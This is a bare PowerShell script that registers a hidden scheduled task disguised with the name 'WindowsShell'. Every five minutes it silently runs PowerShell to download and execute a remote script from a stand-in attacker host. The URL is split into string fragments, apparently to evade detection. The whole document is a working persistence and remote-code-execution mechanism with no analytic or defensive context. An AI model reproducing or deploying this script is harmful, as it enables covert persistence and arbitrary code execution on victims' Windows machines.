$taskname = 'WindowsShell'
$action = New-ScheduledTaskAction -Execute "Powershell" -Argument "-windowstyle hidden iex(new-object net.webclient).DownloadString('ht'+'tp:'+'/'+'/example.attacker.net:80/trigger.ps1')"
$trigger = New-ScheduledTaskTrigger -Once -At 12:14AM -RepetitionDuration  (New-TimeSpan -Days 1)  -RepetitionInterval  (New-TimeSpan -Minutes 5)
$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable
Register-ScheduledTask -TaskName $taskname -Action $action -Trigger $trigger -Settings $settings
